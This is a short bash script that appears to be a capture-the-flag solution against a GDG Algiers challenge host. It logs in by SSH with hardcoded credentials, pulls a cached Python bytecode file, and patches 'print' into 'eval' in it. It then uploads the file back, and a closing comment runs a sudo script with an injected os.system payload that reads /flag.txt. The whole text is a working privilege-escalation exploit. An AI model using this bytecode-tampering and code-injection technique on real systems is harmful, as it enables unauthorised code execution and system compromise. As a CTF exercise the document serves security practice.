#!/bin/bash

USER="ctf"
export SSHPASS="ctf"
HOST="inst.ctf.gdgalgiers.com"
PORT=1337

sshpass -e ssh -o StrictHostKeyChecking=no -p $PORT "$USER"@"$HOST" ./main.py haha
sshpass -e scp -o StrictHostKeyChecking=no -P $PORT "$USER"@"$HOST":/home/ctf/__pycache__/echo.cpython-38.pyc .
sed -i -e "s/\x05print/\x04eval/g" ./echo.cpython-38.pyc
sshpass -e scp -o StrictHostKeyChecking=no -P $PORT ./echo.cpython-38.pyc "$USER"@"$HOST":/home/ctf/__pycache__/echo.cpython-38.pyc
rm ./echo.cpython-38.pyc
sshpass -e ssh -o StrictHostKeyChecking=no -p $PORT "$USER"@"$HOST"
# Now in the SSH session, run:
# sudo /challenge/script.sh '__import__("os").system("cat /flag.txt")'
